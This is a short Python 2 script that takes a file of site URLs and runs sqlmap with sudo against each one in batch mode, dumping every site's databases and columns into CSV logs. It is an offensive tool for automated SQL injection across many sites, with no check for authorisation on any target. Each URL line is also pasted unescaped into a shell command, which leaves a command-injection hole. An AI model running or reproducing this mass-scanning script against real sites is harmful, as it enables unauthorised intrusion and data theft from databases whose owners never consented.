#!/usr/bin/python
import os
import time

os.system("clear")
print "give me a bottle of rum!"
time.sleep(1)
os.system("clear")

count = 0
print "Your file name with sites:"
print "Right there" 
site = raw_input()
site = site.replace("'", '').replace("'", "").replace(' ', '')

with open (site,'rb') as file:
    for line in file:
        count+=1

try:
    def main(count, site):
        os.system("clear")
        print "FileName: ", site
        print "Lines :", count
        time.sleep(2)
        sqlch(site, line, count)

    def sqlch(site, line, count):
        count = 0
        with open (site,'rb') as file:
            for line in file:
                os.system("clear")
                count +=1
                print "FileName: ", site
                print "This is ", count
                os.system("sudo sqlmap -u '"+ line + "' --dbs --columns --batch > ./logs/site"+ str(count) + ".csv")
                print "Ok"
                time.sleep(1)
                os.system("clear")
except KeyboardInterrupt:
    os.system("clear")

if __name__ == "__main__":
    main(count, site)
